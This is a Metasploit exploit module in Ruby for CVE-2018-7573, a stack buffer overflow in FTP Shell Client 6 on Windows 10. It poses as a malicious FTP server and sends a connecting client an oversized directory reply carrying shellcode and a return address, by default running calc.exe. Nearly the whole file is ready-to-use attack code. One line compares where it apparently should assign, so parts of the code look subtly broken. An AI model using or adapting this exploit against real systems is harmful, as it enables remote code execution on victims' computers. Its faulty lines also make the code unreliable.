##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::TcpServer

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'FTP Shell Client - Buffer Overflow',
                      'Description'    => ' This module exploits a buffer
                      overflow vulnerability on FTP Shell Client version 6 ',
                      'Author' =>
                        [
                          'SebastiÃ¡n Castro @r4wd3r', # Original exploit author
                          'Berk Cem Goksel @berkcgoksel', # MSF module author
                        ],
                      'License'        => MSF_LICENSE,
                      'References'     =>
                        [
                          ['CVE', '2018-7573'],
                          %w[EDB 44596]
                        ],
                      'Payload'        =>
                        {
                          'Platform' => 'windows',
                          'Space'       => 400,
                          'DisableNops' => true,
                          'BadChars' => "\x00\x22\x0d\x0a",
                          'StackAdjustment' => -400
                        },
                      'Platform'       => 'win',
                      'Targets'        =>
                        [
                          ['Windows 10',
                           {
                             'Ret'     =>  0x452eed,
                             # CALL ESI from FTPShell.exe
                             'Offset'  =>  400
                           }]
                        ],
                      'Privileged'     => false,
                      'DefaultOptions' =>
                        {
                          'EXITFUNC' => 'thread',
                          'DisablePayloadHandler' => 'true',
                          'SRVHOST' => '0.0.0.0',
                          'Payload' => 'windows/exec',
                          'CMD' => 'calc.exe'

                        },
                      'DisclosureDate' => 'Jun 10 2018',
                      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('SRVPORT', [true, 'The FTP port to listen on', 21])
      ]
    )
  end

  def exploit
    srv_ip_for_client = datastore['SRVHOST']
    if srv_ip_for_client == '0.0.0.0'
      srv_ip_for_client = datastore['LHOST'] ||
                          Rex::Socket.source_address('50.50.50.50')
    end

    srv_port = datastore['SRVPORT']

    print_status("Ask your target(s) to connect to
    #{srv_ip_for_client}:#{srv_port}")
    super
  end

  def on_client_connect(client)
    return if (p == regenerate_payload(client)).nil?
    print_status("#{client.peerhost} - connected")

    # Let the client log in
    client.get_once

    print_status("#{client.peerhost} - sending 220 FTP Server")
    welcome = "220 FTP Server\r\n"
    client.put(welcome)
    client.get_once

    print_status("#{client.peerhost} - sending 331 OK")
    user = "331 OK\r\n"
    client.put(user)
    client.get_once

    print_status("#{client.peerhost} - sending 230 OK")
    pass = "230 OK\r\n"
    client.put(pass)
    client.get_once

    # Followed the following advice from Sinn3r:
    #
    # It is important to use 0x20 (space) as the first chunk of the buffer,
    # because this chunk is visible from the user's command prompt, which
    # would make the buffer overflow attack too obvious.

    sploit = '220 "'

    sploit << make_nops(16)
    sploit << payload.encoded
    # sploit << Rex::Text.rand_text(400 - 16 - 6 - payload.encoded.length,
    # payload_badchars)
    sploit << "\x20" * (400 - 16 - 220 - 6)
    sploit << [target.ret].pack('V')
    sploit << "\" is current directory\r\n"

    print_status("#{client.peerhost} - sending the malicious response")
    client.put(sploit)

    client.get_once
  end
end
